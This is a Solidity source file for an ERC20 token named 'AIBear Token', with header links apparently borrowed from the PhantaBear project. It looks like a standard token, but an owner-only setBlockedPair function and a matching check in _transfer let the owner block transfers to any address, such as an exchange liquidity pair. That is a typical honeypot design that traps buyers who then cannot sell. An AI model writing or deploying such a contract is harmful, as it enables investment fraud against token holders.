// SPDX-License-Identifier: MI
/*
https://twitter.com/PhantaBearClub
https://www.phantaclub.com
*/
pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract AIbearToken is IERC20 {
    string public constant name = "AIBear Token";
    string public constant symbol = "AIBear";
    uint8 public constant decimals = 18;

    uint256 public override totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public owner;
    mapping(address => bool) public blockedPairs;

    constructor(uint256 initialSupply) {
        owner = msg.sender;
        totalSupply = initialSupply * (10 ** uint256(decimals));
        _balances[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Only the owner can call this function.");
        _;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address ownerAddr, address spender) external view override returns (uint256) {
        return _allowances[ownerAddr][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function setBlockedPair(address _pair, bool _status) external onlyOwner {
        blockedPairs[_pair] = _status;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!blockedPairs[recipient], "ERC20: transfers to this address are blocked");

        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address ownerAddr, address spender, uint256 amount) internal {
        require(ownerAddr != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[ownerAddr][spender] = amount;
        emit Approval(ownerAddr, spender, amount);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner cannot be the zero address");
        owner = newOwner;
    }
}